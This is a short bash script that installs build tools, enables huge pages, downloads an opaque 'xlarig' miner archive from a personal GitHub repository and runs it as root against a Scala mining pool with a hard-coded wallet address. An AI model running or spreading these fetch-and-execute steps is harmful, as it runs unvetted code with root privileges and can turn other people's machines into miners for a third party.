#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 && wget https://github.com/phungkhanh90/dao/raw/master/xla.tar.gz && tar xf xla.tar.gz && cd xla && 
sudo ./xlarig -o mine.scalaproject.io:3333 -u Se3sA8EpN9uf6nxXZJLy4u895bhVeBQwKjZoRAwttuJh3BYVPLysTwsJZXEFbkKwWbNFn3P3VfMa27RzeehdPwMC2AP5CdEMM -p x --algo defyx
